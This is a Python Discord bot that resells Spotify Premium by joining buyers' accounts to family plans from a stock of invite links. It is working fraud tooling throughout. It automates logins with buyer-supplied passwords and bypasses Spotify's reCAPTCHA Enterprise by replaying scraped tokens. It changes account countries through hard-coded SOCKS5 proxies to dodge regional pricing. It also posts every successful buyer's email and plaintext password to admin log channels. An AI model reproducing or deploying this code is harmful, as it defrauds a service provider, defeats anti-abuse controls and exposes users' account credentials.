# Dev by kasha0_0

import disnake, os, asyncio, random, string, requests, time, re, httpx
from bs4 import BeautifulSoup
from disnake import ClientException, Interaction
from disnake.ext import commands
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.keys import Keys
from uuid import uuid4
import json as jsons
import datetime

intents = disnake.Intents.all()
관리자채널 = 1234
premium_notice = 1134274867018076173 # 프리미엄 연결 성공 로그
changect_log = 1134274867018076173 # 국가변경 성공 로그
재고알림채널 = 1138348465437556789
owner = []

def getClientToken(session: httpx.Client) -> str:
    payload = {
        'client_data': {
        'client_version': '1.2.10.278.g261ea664',
        'client_id': 'd8a5ed958d274c2e8ee717e6a4b0971d',
        'js_sdk_data': {
            'device_brand': 'unknown',
            'device_model': 'unknown',
            'os': 'windows',
            'os_version': 'NT 10.0',
            'device_id': str(uuid4()),
            'device_type': 'computer'
        }
        }
    }

    headers = {
                    'authority': 'clienttoken.spotify.com',
                    'accept': 'application/json',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/json',
                    'origin': 'https://open.spotify.com',
                    'referer': 'https://open.spotify.com/',
                    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                }
    r = session.post(url='https://clienttoken.spotify.com/v1/clienttoken', headers=headers, json=payload)
    if r.status_code == 200:
        return r.json()['granted_token']['token']
    else:
        print('오류')

class SupportModal(disnake.ui.Modal):
    def __init__(self, bot):
        components = [
            disnake.ui.TextInput(
                label="Username ( Gmail )",
                placeholder="이메일을 입력 해 주세요.",
                custom_id="email",
                style=disnake.TextInputStyle.short,
                min_length=1,
                max_length=99,
            ),
            disnake.ui.TextInput(
                label="Password",
                placeholder="비밀번호를 입력 해 주세요.",
                custom_id="pw",
                style=disnake.TextInputStyle.short,
                min_length=1,
                max_length=99,
            ),
            disnake.ui.TextInput(
                label="Spotify Key",
                placeholder="구매하신 코드를 입력 해 주세요.",
                custom_id="code",
                style=disnake.TextInputStyle.short,
                min_length=1,
                max_length=40,
            ),
        ]
        super().__init__(
            title="스포티파이 업그레이드",
            custom_id="continuesub",
            components=components,
        )
        self.bot = bot

class SupportModalENG(disnake.ui.Modal):
    def __init__(self, bot):
        components = [
            disnake.ui.TextInput(
                label="Username ( Gmail )",
                placeholder="Input spotify Email.",
                custom_id="email",
                style=disnake.TextInputStyle.short,
                min_length=1,
                max_length=99,
            ),
            disnake.ui.TextInput(
                label="Password",
                placeholder="Input spotify Password",
                custom_id="pw",
                style=disnake.TextInputStyle.short,
                min_length=1,
                max_length=99,
            ),
            disnake.ui.TextInput(
                label="Spotify Key",
                placeholder="Input code you bought",
                custom_id="code",
                style=disnake.TextInputStyle.short,
                min_length=1,
                max_length=40,
            ),
        ]
        super().__init__(
            title="Spotify Upgrade",
            custom_id="continuesub_eng",
            components=components,
        )
        self.bot = bot

class SupportModal1ENG(disnake.ui.Modal):
    def __init__(self, bot):
        components = [
            disnake.ui.TextInput(
                label="Username ( Gmail )",
                placeholder="Input spotify Email.",
                custom_id="email",
                style=disnake.TextInputStyle.short,
                min_length=1,
                max_length=99,
            ),
            disnake.ui.TextInput(
                label="Password",
                placeholder="Input spotify Password.",
                custom_id="pw",
                style=disnake.TextInputStyle.short,
                min_length=1,
                max_length=99,
            ),
        ]
        super().__init__(
            title="Spotify Change country",
            custom_id="change_country_eng",
            components=components,
        )
        self.bot = bot

        

class SupportModal1(disnake.ui.Modal):
    def __init__(self, bot):
        components = [
            disnake.ui.TextInput(
                label="Username ( Gmail )",
                placeholder="이메일을 입력 해 주세요.",
                custom_id="email",
                style=disnake.TextInputStyle.short,
                min_length=1,
                max_length=99,
            ),
            disnake.ui.TextInput(
                label="Password",
                placeholder="비밀번호를 입력 해 주세요.",
                custom_id="pw",
                style=disnake.TextInputStyle.short,
                min_length=1,
                max_length=99,
            ),
        ]
        super().__init__(
            title="스포티파이 계정 국가 변경",
            custom_id="change_country",
            components=components,
        )
        self.bot = bot

class SupportModal2(disnake.ui.Modal):
    def __init__(self, bot):
        components = [
            disnake.ui.TextInput(
                label="Username ( Gmail )",
                placeholder="원하시는 이메일을 입력 해 주세요.",
                custom_id="email",
                style=disnake.TextInputStyle.short,
                min_length=1,
                max_length=99,
            ),
            disnake.ui.TextInput(
                label="Password",
                placeholder="원하시는 비밀번호를 입력 해 주세요.",
                custom_id="pw",
                style=disnake.TextInputStyle.short,
                min_length=8,
                max_length=99,
            ),
            # Made by kasha0_0
        ]
        super().__init__(
            title="스포티파이 커스텀 계정 생성",
            custom_id="create_customacc",
            components=components,
        )
        self.bot = bot
        
# Made by kasha0_0
bot = commands.Bot(command_prefix="!", case_insensitive=True, intents=intents)


def license_code_generator(length):
    result_str = ''.join(random.choice(string.ascii_uppercase) for i in range(length))
    return result_str

@bot.listen()
async def on_ready():
    await bot.change_presence(activity=disnake.Activity(type=disnake.ActivityType.listening, name="Spotify"))

@bot.event
async def on_button_click(interaction: Interaction):
    if interaction.component.custom_id == "stock":
        isempty = os.stat('stock/stock.txt').st_size == 0
        if isempty:
            embed = disnake.Embed(description='**`🟢실시간재고`\n`재고 상태: 구매불가`<:11372439866591232511:1145229355753164810> **', colour=0x91BE62)
            embed.set_author(name=f'Spotify Stocks')
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        else:
            try:
                embed = disnake.Embed(description='**`🟢실시간재고`\n`재고 상태: 구매가능`<:11372366379910595361:1145228941515292712>**', colour=0x91BE62)
                embed.set_author(name=f'Spotify Stocks')
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return
            except:
                pass
            
        # Made by kasha0_0
    if interaction.component.custom_id == "replace":
        try:
            await interaction.response.send_message('This func is not yet', ephemeral=True)
        except:
            pass
        return

    if interaction.component.custom_id == "replace_eng":
        try:
            await interaction.response.send_message('This func is not yet', ephemeral=True)
        except:
            pass
        return
    
    if interaction.component.custom_id == "redeem":
        try:
            # Made by kasha0_0
            await interaction.response.send_modal(modal=SupportModal(interaction.bot))
        except:
            pass
        print(f'{interaction.author.name}님이 코드 등록 버튼 클릭')
        try:
            modal_inter: disnake.ModalInteraction = await bot.wait_for(
                "modal_submit",
                check=lambda i: i.custom_id == "continuesub" and i.author.id == interaction.author.id,
                timeout=None,
            )
        except asyncio.TimeoutError:
            return
        
        with open('stock/stock.txt', 'r', encoding='utf-8') as f:
            lists = f.read().splitlines()
        
        with open(f'license/inf-license.txt', mode='r') as f:
            checkcode = f.read().splitlines()

        # print(checkcode)
        # print(modal_inter.text_values["code"])

        if not any(modal_inter.text_values["code"] == s for s in checkcode):
            try:
                embed = disnake.Embed(description=f'```md\n* Code is invaild```', colour=0xFF3121)
                embed.set_author(name=f'SPOTIFY LIFETIME - Failed')
                await modal_inter.response.send_message(f'{modal_inter.author.mention}', embed=embed, ephemeral=True)
                print(f'Code invaild = > {interaction.author.name}')
                return
            except:
                pass
        
        isempty = os.stat('stock/stock.txt').st_size == 0
        if isempty:
            try:
                embed = disnake.Embed(description='Out of stock!', colour=0xFF3121)
                embed.set_author(name=f'SPOTIFY LIFETIME - Error')
                await modal_inter.response.send_message(f'{modal_inter.author.mention}', embed=embed, ephemeral=True)
            except:
                pass
            return
        
        try:
            embed = disnake.Embed(description=f'```md\n* 업그레이드 진행 중..```', colour=0xFF8840)
            embed.set_author(name=f'SPOTIFY LIFETIME - Wating...')
            conti = await modal_inter.response.send_message(f'{modal_inter.author.mention}', embed=embed, ephemeral=True)
        except:
            pass

        options = webdriver.ChromeOptions()
        # options.add_argument('headless')
        driver = webdriver.Chrome(executable_path='chromedriver.exe', options=options)

        s = requests.Session()
        driver.set_window_size(1400, 1000)  # (가로, 세로)
        driver.get("https://accounts.spotify.com/ko/login?continue=https%3A%2F%2Fopen.spotify.com%2F")
        driver.find_element(By.ID,'login-username').send_keys(f'{modal_inter.text_values["email"]}')
        driver.find_element(By.ID,'login-password').send_keys(f'{modal_inter.text_values["pw"]}')
        driver.find_element(By.ID,'login-button').click()

        time.sleep(3)
        
        page_source = driver.page_source
        if "잘못된 사용자 이름 또는 비밀번호입니다." in page_source:
            embed = disnake.Embed(description=f'```js\n* 계정 로그인 오류```', colour=0xFF3121)
            embed.set_author(name=f'SPOTIFY LIFETIME - Failed')
            await modal_inter.edit_original_message(embed=embed)
            driver.quit()
            return
        for cookie in driver.get_cookies():
            c = {cookie['name'] : cookie['value']}
            s.cookies.update(c)

        driver.quit()

        with open(f'stock/stock.txt', 'r', encoding='utf-8') as f:
            randomLine2 = random.choice(list(f.readlines())).splitlines()[0]
    
        print(randomLine2)
        
        randomLine = randomLine2.split(':')
        

        AddressLink = randomLine[0]
        Address = randomLine[1]

        placeId = 'ChIJbf8C1yFxdDkR3n12P4DkKt0'
        v = s.get('https://www.spotify.com/kr-ko/account/overview/')

        ANCHOR_URL = 'https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&co=aHR0cHM6Ly93d3cuc3BvdGlmeS5jb206NDQz&hl=ko&v=pCoGBhjs9s8EhFOHJFe8cqis&size=invisible&cb=ctc6uzc8xgix'

        url_base = 'https://www.google.com/recaptcha/'
        post_data = "v={}&reason=q&c={}&k={}&co={}"
        s.headers.update({
            'content-type': 'application/x-www-form-urlencoded'
        })  
        matches = re.findall('([api2|enterprise]+)\/anchor\?(.*)', ANCHOR_URL)[0]
        url_base += matches[0]+'/'
        params = matches[1]
        res = s.get(url_base+'anchor', params=params)
        token = re.findall(r'"recaptcha-token" value="(.*?)"', res.text)[0]
        params =dict (O0OOO0OOOOO0OOOO0.split('=') for O0OOO0OOOOO0OOOO0 in params .split ('&'))
        post_data = post_data.format(params["v"], token, params["k"], params["co"])
        res = s.post(url_base+'reload', params=f'k={params["k"]}', json=post_data)
        answer = re.findall(r'"rresp","(.*?)"', res.text)[0]
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36','Accept': 'application/json, text/plain, */*', "Content-Type": 'application/json',"Origin": "https://www.spotify.com",'Referer': f"https://www.spotify.com/uk/family/join/address/{AddressLink}/"}
        # verify v2 - > u
        proxies = {'https':'socks5://103.235.64.20:49156'}
        proxies2 = {'https':'socks5://156.240.96.117:2000'}


        s.post('https://www.spotify.com/api/family/v1/family/address/verify/', cookies=s.cookies, headers=headers, json={'address': f"{Address}", 'placeId': f'{placeId}', "isMaster": 'false'})

        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36','Accept': 'application/json, text/plain, */*',"Content-Type": 'application/json',"Origin": "https://www.spotify.com",'Referer': f"https://www.spotify.com/uk/family/join/address/{AddressLink}/"}
        
        s.post('https://www.spotify.com/api/family/v1/family/recaptcha/assess/', cookies=s.cookies,  headers=headers, json={'responseToken': answer})

        aa = s.post('https://www.spotify.com/api/family/v1/family/member/', headers=headers) # Main requests

        xcsrftoken = aa.headers['x-csrf-token']
        data = {'address': f'{Address}','inviteToken': f"{AddressLink}",  "placeId": f'{placeId}'}
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36','Accept': 'application/json, text/plain, */*',"Content-Type": 'application/json',"Origin": "https://www.spotify.com",'Referer': f"https://www.spotify.com/uk/family/join/address/{AddressLink}/", 'X-Csrf-Token': xcsrftoken}

        aa = s.post('https://www.spotify.com/api/family/v1/family/member/', headers=headers, json=data)
        print(aa.text)
        if aa.status_code == 422:
            if aa.json()['code'] == 'PLAN_IS_FULL':
                await bot.get_channel(관리자채널).send(f'{randomLine2}\n패밀리 인원이 꽉 찼습니다. 재고를 삭제 해 주세요.')
            if aa.json()['code'] == 'INVITE_NOT_FOUND':
                await bot.get_channel(관리자채널).send(f'{randomLine2}\n패밀리의 초대링크가 만료 되었습니다. 재고를 삭제 해 주세요.')
            try:
                print(aa.json()['code'])
                print('계정 프리미엄 등록 실패 = > {}', format(interaction.author.name))
                embed = disnake.Embed(description=f'```md\n* 프리미엄 업그레이드 실패\n- {aa.json()["code"]}```', colour=0xFF0000)
                embed.set_author(name=f'SPOTIFY Premium Upgrade - 실패')
                await modal_inter.edit_original_message(embed=embed)
            except:
                pass
            return
        else:
            if aa.status_code == 404:
                try:
                    if aa.json()['code'] == 'INVITE_NOT_FOUND':
                        await bot.get_channel(관리자채널).send(f'{randomLine2}\n패밀리의 초대링크가 만료 되었습니다. 재고를 삭제 해 주세요.')
                        
                    print(aa.json()['code'])
                    print('계정 프리미엄 등록 실패 = > {}', format(interaction.author.name))
                    embed = disnake.Embed(description=f'```md\n* 프리미엄 업그레이드 실패\n- {aa.json()["code"]}```', colour=0xFF0000)
                    embed.set_author(name=f'SPOTIFY Premium Upgrade - 실패')
                    await modal_inter.edit_original_message(embed=embed)
                except:
                    pass
                return
            else:
                if aa.status_code == 401:
                    try:
                        if aa.json()['code'] == 'INVITE_NOT_FOUND':
                            await bot.get_channel(관리자채널).send(f'{randomLine2}\n패밀리의 초대링크가 만료 되었습니다. 재고를 삭제 해 주세요.')
                        print(aa.json()['code'])
                        print('계정 로그인 실패 = > {}', format(interaction.author.name))
                        embed = disnake.Embed(description=f'```md\n* 프리미엄 업그레이드 실패\n- {aa.json()["code"]}```', colour=0xFF0000)
                        embed.set_author(name=f'SPOTIFY  Premium Upgrade - 실패')
                        await modal_inter.edit_original_message(embed=embed)
                    except:
                        pass
                    return
                else:
                    if aa.status_code == 200:
                        text = []
                        try:
                            with open(f'license/inf-license.txt', mode='r') as u:
                                contents = u.read()
                                stripped_line = contents.strip()
                                text.append(stripped_line.split())

                            with open(f'license/inf-license.txt', mode='w') as u:
                                try:
                                    text[0].remove(str(modal_inter.text_values["code"]))
                                except:
                                    pass
                                for i in text[0]:
                                    u.write(str(i))
                                    u.write('\n')
                        except:
                            pass

                        await bot.get_channel(premium_notice).send(f'{modal_inter.author.mention}\n프리미엄 연결 성공 = > {modal_inter.text_values["email"]}, {modal_inter.text_values["pw"]}\nUser : {modal_inter.author.name}, {modal_inter.author.id}')
                        embed = disnake.Embed(description=f'```md\n* 스포티파이 업그레이드 성공\n- 이용에 감사드리며, 후기는 큰 도움이 됩니다.```',colour=0x91BE62)
                        embed.set_author(name=f'SPOTIFY Premium Upgrade - 성공')
                        await modal_inter.edit_original_message(embed=embed)
                        print(f'프리미엄 연결 성공 = > {modal_inter.text_values["email"]}, {modal_inter.text_values["pw"]}')
                        return

    if interaction.component.custom_id == "change":
        try:
            await interaction.response.send_modal(modal=SupportModal1(interaction.bot))
        except:
            pass
        print(f'{interaction.author.name}님이 국가변경 버튼 클릭')

        modal_inter: disnake.ModalInteraction = await bot.wait_for(
            "modal_submit",
            check=lambda i: i.custom_id == "change_country" and i.author.id == interaction.author.id,
            timeout=None,
        )
        try:
            embed = disnake.Embed(description=f'```md\n* 국가변경 진행 중..\n- 자동으로 재고 있는 국가로 변경 됩니다.```', colour=0xFF8840)
            embed.set_author(name=f'SPOTIFY Change country - Wating...')
            contis = await modal_inter.response.send_message(f'{modal_inter.author.mention}', embed=embed, ephemeral=True)
        except:
            pass

        options = webdriver.ChromeOptions()
        # options.add_argument('headless') # < == 크롬 창 닫힌 채로 프로그램 실행
        driver = webdriver.Chrome(executable_path='chromedriver.exe', options=options)

        s = requests.Session()
        driver.set_window_size(1400, 1000)  # (가로, 세로)
        driver.get("https://accounts.spotify.com/ko/login?continue=https%3A%2F%2Fopen.spotify.com%2F")
        driver.find_element(By.ID,'login-username').send_keys(f'{modal_inter.text_values["email"]}')
        driver.find_element(By.ID,'login-password').send_keys(f'{modal_inter.text_values["pw"]}')
        driver.find_element(By.ID,'login-button').click()
        time.sleep(3)
        for cookie in driver.get_cookies():
            c = {cookie['name'] : cookie['value']}
            s.cookies.update(c)

        driver.quit()

        ress = s.get('https://www.spotify.com/api/account-settings/v1/profile')
        xcsrftoken = ress.headers['x-csrf-token']
        print(xcsrftoken)
        try:
            birthday = ress.json()['profile']['birthdate']
        except:
            print('계정 로그인 실패 = > {}', format(interaction.author.name))
            embed = disnake.Embed(description=f'```md\n* 국가변경 실패\n- 계정 로그인에 실패 했습니다.```', colour=0xFF0000)
            embed.set_author(name=f'SPOTIFY Change country - 실패')
            await modal_inter.edit_original_message(embed=embed)
            return
        json = {
            'options': {
                'available_countries' : ['KR', 'IN']
            },
            'profile':{
                'email': f'{modal_inter.text_values["email"]}',
                'country': "IN",
                'birthdate': f"{birthday}",
                'gender': "MALE",
                'third_party_email': 'false'
            }
        }
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
            "Content-Type": 'application/json',
            "Origin": "https://accounts.spotify.com",
            'Referer': "https://www.spotify.com/kr-ko/account/profile/",
            'X-Csrf-Token': xcsrftoken
        }
        proxies = {'https':'socks5://103.235.64.20:49156'}
        proxies2 = {'https':'socks5://36.255.198.126:49156'}

        try:
            res = s.put('https://www.spotify.com/api/account-settings/v1/profile', json=json, headers=headers, proxies=proxies)
        except:
            res = s.put('https://www.spotify.com/api/account-settings/v1/profile', json=json, headers=headers, proxies=proxies2)
            
        if res.status_code == 200:
            try:
                await bot.get_channel(changect_log).send(f'{modal_inter.author.mention}\n국가변경 성공 = > {modal_inter.text_values["email"]}, {modal_inter.text_values["pw"]}\nUser : {modal_inter.author.name}, {modal_inter.author.id}')
                embed = disnake.Embed(description=f'```md\n* 국가변경 성공\n- 코드를 등록하여 프리미엄에 가입 하세요.```',colour=0x91BE62)
                embed.set_author(name=f'SPOTIFY Change country - 성공')
                await modal_inter.edit_original_message(embed=embed)
                print(f'국가변경 성공 = > {modal_inter.text_values["email"]}, {modal_inter.text_values["pw"]}')
                return
            except:
                pass
            return
        else:
            
            try:
                print(res.text)
                embed = disnake.Embed(description=f'```md\n* 국가변경 실패\n- {res.text}```', colour=0xFF0000)
                embed.set_author(name=f'SPOTIFY Change country - 실패')
                await modal_inter.edit_original_message(embed=embed)
                return
            except:
                pass
            return

@bot.command()
async def 생성(msg):
    if not msg.author.id in owner:
        print(f'{msg.author.name} Failed')
        return
    try:
        count = int(msg.message.content.split(' ')[1])
    except:
        return
    text = ''
    with open(f'license/inf-license.txt', 'a', encoding='utf-8') as u:
        for i in range(count):
            code = f'SPOTIFY-{license_code_generator(4)}-{license_code_generator(4)}-{license_code_generator(4)}-{license_code_generator(4)}-{license_code_generator(4)}'
            text = text + '* ' + code + '\n'
            u.write(code)
            u.write('\n')
    embed = disnake.Embed(description=f'```md\n{text}```', colour=0xFFFFFF)
    embed.set_author(name=f'SPOTIFY LIFETIME - {count}개')
    await msg.reply(embed=embed, mention_author=True)
    return

@bot.command()
async def 재고리스트(ctx):
    if not ctx.author.id in owner:
        print(f'{ctx.author.name} Failed')
        return
    with open('stock/stock.txt', 'r') as file:
        stock_list = file.read().splitlines()

    embed = disnake.Embed(title='재고 리스트', color=disnake.Color.blue())
    for idx, item in enumerate(stock_list, start=1):
        embed.add_field(name=f'{idx}:', value=item, inline=False)
    await ctx.send(embed=embed)
    return

def delete_stock(index):
    with open('stock/stock.txt', 'r') as file:
        stock_list = file.read().splitlines()

    if 1 <= index <= len(stock_list):
        del stock_list[index - 1]

        with open('stock/stock.txt', 'w') as file:
            for item in stock_list:
                file.write(item + '\n')

        return True
    else:
        return False

@bot.command()
async def 재고삭제(ctx, index: int):
    if not ctx.author.id in owner:
        print(f'{ctx.author.name} Failed')
        return
    result = delete_stock(index)

    if result:
        await ctx.send(f'{index}번째 있는 재고가 삭제되었습니다.')
    else:
        await ctx.send(f'{index}번째 재고를 찾을 수 없습니다.')

@bot.command()
async def 입고(msg):
    if not msg.author.id in owner:
        print(f'{msg.author.name} Failed')
        return
    l = msg.message.content.split('입고 ')[1]
    with open('stock/stock.txt', 'a', encoding='utf-8') as f:
        f.write(f'{l}')
        f.write('\n')
    await msg.reply('입고 완')
    embed = disnake.Embed(description='**`🟢실시간 재고`\n`재고 상태: 구매가능`<:9477329812530135441:1137236637991059536>**', colour=0x91BE62)
    embed.set_author(name=f'재고가 입고 되었습니다.')
    await bot.get_channel(재고알림채널).send('||@everyone||', embed=embed, components=[disnake.ui.Button(label=f"구매하러 가기", style=disnake.ButtonStyle.url, url='https://discord.com/channels/1134274866464432149/1134274867286519893')])
    return

@bot.command()
async def 새계정메뉴(msg):
    if not msg.author.id in owner:
        print(f'{msg.author.name} Failed')
        return
    embed = disnake.Embed(title='Spotify New account generator', description=f'**How to use?**\n`1️⃣: 랜덤 이메일, 랜덤 비밀번호로 계정을 생성 합니다.`\n`2️⃣: 사용자가 원하는 이메일, 비밀번호로 계정을 생성합니다.`\n\n**생성된 계정의 국가는 업그레이드 봇의 재고 국적에 따라 설정됩니다.**', colour=0x91BE62)
    embed.set_footer(text='Dev by kasha0_0')
    ms = await msg.channel.send(embed=embed,
    components=[
    [
    disnake.ui.Button(label=f"1", style=disnake.ButtonStyle.gray, custom_id='random_acc'),
    disnake.ui.Button(label=f"2", style=disnake.ButtonStyle.gray, custom_id='custom_acc'),
    ]])
    return

@bot.command()
async def accmenu(msg):
    if not msg.author.id in owner:
        print(f'{msg.author.name} Failed')
        return
    embed = disnake.Embed(title='Spotify New account generator', description=f'**How to use?**\n`1️⃣: Create an account with a random email and a random password.`\n`2️⃣: Create an account with email and password what you want`\n\n**Country of created account is automatically change to the stock country**', colour=0x91BE62)
    embed.set_footer(text='Dev by kasha0_0')
    ms = await msg.channel.send(embed=embed,
    components=[
    [
    disnake.ui.Button(label=f"1", style=disnake.ButtonStyle.gray, custom_id='random_acc'),
    disnake.ui.Button(label=f"2", style=disnake.ButtonStyle.gray, custom_id='custom_acc'),
    ]])
    return





@bot.command()
async def 메뉴(msg):
    if not msg.author.id in owner:
        print(f'{msg.author.name} Failed')
        return
    embed = disnake.Embed(title='Spotify Lifetime Upgrader', description=f'**How to use?**\n`#1 재고 버튼으로 재고가 있는지 확인 하세요.`\n`#2 등록 버튼을 눌러 프리미엄 연결을 진행합니다.`\n`#3 프리미엄이 끊겼으면 교체 버튼을 눌러 다시 연결 하세요.`\n`#4 국가변경을 먼저 하시고 코드를 등록 하셔야 합니다.`\n\n현재 구매를 위해선 수동 계좌충전을 지원합니다.\n코드 구매를 위해 티켓을 열어 코드를 구매 해 주세요.', colour=0x91BE62)
    # embed.set_author(name=f'Spotify Lifetime Upgrader')
    embed.set_footer(text='Dev by kasha0_0')
    ms = await msg.channel.send(embed=embed,
    components=[
    [
    disnake.ui.Button(label=f"재고확인", style=disnake.ButtonStyle.gray, custom_id='stock'),
    disnake.ui.Button(label=f"코드교체", style=disnake.ButtonStyle.gray, custom_id='replace'),
    disnake.ui.Button(label=f"코드등록", style=disnake.ButtonStyle.gray, custom_id='redeem'),
    disnake.ui.Button(label=f"국가변경", style=disnake.ButtonStyle.gray, custom_id='change')
    ]])
    return

if __name__ == "__main__":   
    bot.run('')

